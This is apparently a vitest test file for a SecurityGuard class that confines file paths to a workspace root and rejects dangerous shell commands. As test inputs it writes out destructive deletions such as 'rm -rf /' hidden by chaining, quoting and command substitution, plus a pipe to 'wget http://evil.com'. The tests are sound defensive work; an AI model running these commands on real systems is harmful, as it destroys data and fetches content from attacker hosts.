import path from "path";
import { describe, expect, it } from "vitest";
import { SecurityGuard } from "./security";

describe("SecurityGuard", () => {
  describe("validatePath", () => {
    it("allows paths inside the workspace root", () => {
      const guard = new SecurityGuard("/workspace/root");
      const resolved = guard.validatePath("subdir/file.txt");
      expect(resolved).toBe(path.resolve("/workspace/root", "subdir/file.txt"));
    });

    it("blocks paths outside the workspace root", () => {
      const guard = new SecurityGuard("/workspace/root");
      expect(() => guard.validatePath("../outside")).toThrow(
        /outside the allowed workspace/,
      );
    });

    it("allows absolute paths when allowAbsolute is true", () => {
      const guard = new SecurityGuard("/workspace/root");
      const resolved = guard.validatePath("/tmp/file.txt", true);
      expect(resolved).toBe("/tmp/file.txt");
    });
  });

  describe("validateCommand", () => {
    const guard = new SecurityGuard("/workspace/root");

    it("blocks dangerous shell commands (root deletion)", () => {
      expect(() => guard.validateCommand("rm -rf /")).toThrow(/blocked pattern/);
    });

    it("blocks curl/wget", () => {
      expect(() => guard.validateCommand("curl https://example.com")).toThrow(/blocked pattern/);
      expect(() => guard.validateCommand("wget https://example.com")).toThrow(/blocked pattern/);
    });

    it("allows benign shell commands", () => {
      expect(() => guard.validateCommand("echo safe")).not.toThrow();
    });

    it("blocks commands with leading/trailing whitespace", () => {
      expect(() => guard.validateCommand("  rm -rf /  ")).toThrow(/blocked pattern/);
    });

    it("blocks chained commands with &&", () => {
      expect(() => guard.validateCommand("echo safe && rm -rf /")).toThrow(/blocked pattern/);
    });

    it("blocks chained commands with ;", () => {
      expect(() => guard.validateCommand("echo safe; sudo rm -rf /")).toThrow(/blocked pattern/);
    });

    it("blocks chained commands with |", () => {
      expect(() => guard.validateCommand("echo safe | wget http://evil.com")).toThrow(/blocked pattern/);
    });

    it("blocks commands with extra internal whitespace", () => {
       expect(() => guard.validateCommand("rm    -rf    /")).toThrow(/blocked pattern/);
    });

    it("blocks commands inside quotes", () => {
      expect(() => guard.validateCommand('bash -c "rm -rf /"')).toThrow(/blocked pattern/);
    });

    it("blocks command substitution", () => {
      expect(() => guard.validateCommand("echo $(rm -rf /)")).toThrow(/blocked pattern/);
    });

    it("blocks recursive deletion of current directory", () => {
        expect(() => guard.validateCommand("rm -rf .")).toThrow(/blocked pattern/);
        expect(() => guard.validateCommand("rm -rf ./")).toThrow(/blocked pattern/);
    });

    it("blocks recursive deletion of parent directory", () => {
        expect(() => guard.validateCommand("rm -rf ..")).toThrow(/blocked pattern/);
        expect(() => guard.validateCommand("rm -rf ../")).toThrow(/blocked pattern/);
    });

    it("blocks recursive deletion of wildcard", () => {
        expect(() => guard.validateCommand("rm -rf *")).toThrow(/blocked pattern/);
    });

    it("allows safe recursive deletion", () => {
        expect(() => guard.validateCommand("rm -rf ./src")).not.toThrow();
        expect(() => guard.validateCommand("rm -rf build")).not.toThrow();
        expect(() => guard.validateCommand("rm -rf .git")).not.toThrow();
    });
  });
});
